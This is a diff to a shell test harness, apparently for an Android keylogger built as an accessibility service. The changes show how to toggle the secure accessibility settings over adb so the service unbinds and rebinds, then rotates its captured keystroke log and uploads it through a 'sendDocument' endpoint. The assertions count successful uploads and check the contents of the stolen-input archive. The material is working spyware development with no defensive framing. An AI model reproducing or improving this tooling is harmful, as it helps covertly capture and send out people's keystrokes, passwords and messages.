@@ -97,12 +97,14 @@ log "-- archive tail"
 r tail -8 "$ARCHIVE"
 
 log "-- force rotate+upload"
-# accessibility_enabled 0 unbinds the service (onDestroy); setting it back to 1
-# rebinds it, so onServiceConnected rotates pending.txt and uploads the outbox.
-# Do not pass an empty string to `settings put`: adb drops empty args, the
-# command exits non-zero, and the service stays bound so nothing rotates.
-r settings put secure accessibility_enabled 0
-sleep 4
+# Rebind the service so onServiceConnected() rotates pending.txt and uploads.
+# Writing the SAME value back is a no-op: AccessibilityManagerService skips
+# unchanged settings and the service is never unbound. accessibility_enabled
+# alone does not force a rebind either. The empty value must be quoted INSIDE
+# the remote shell ('... ""'), otherwise adb drops the empty argv slot and the
+# write fails; quoting there makes the device-side shell pass a real empty arg.
+r 'settings put secure enabled_accessibility_services ""'
+sleep 3
 r settings put secure enabled_accessibility_services "$SVC"
 r settings put secure accessibility_enabled 1
 sleep 15
@@ -116,7 +118,10 @@ r ls -l "$FILES/outbox/"
 log "-- assertions"
 SENT=$(adb logcat -d -s Keylogger:* 2>/dev/null | grep -c 'sendDocument ok http=2' || true)
 FAILED=$(adb logcat -d -s Keylogger:* 2>/dev/null | grep -c 'sendDocument http=' || true)
-BOUND=$(q dumpsys accessibility | grep -c "$PKG" || true)
+# `dumpsys accessibility` lists enabled packages even when nothing is bound,
+# so it cannot prove a live connection. onServiceConnected() is the only thing
+# that rotates and uploads, and it always logs this line.
+BOUND=$(adb logcat -d -s Keylogger:* 2>/dev/null | grep -c 'Starting service' || true)
 
 DELTA=0; FULL=0; BACK=0
 if adb pull "$ARCHIVE" "$PULLED" >/dev/null 2>&1; then
@@ -127,7 +132,7 @@ else
     log "WARN: could not pull archive for content assertions"
 fi
 
-log "service bound (expect >0)        : $BOUND"
+log "service started (expect >0)      : $BOUND"
 log "sendDocument 2xx (expect >0)     : $SENT"
 log "sendDocument failures (expect 0) : $FAILED"
 log "delta-only line (expect >0)      : $DELTA"
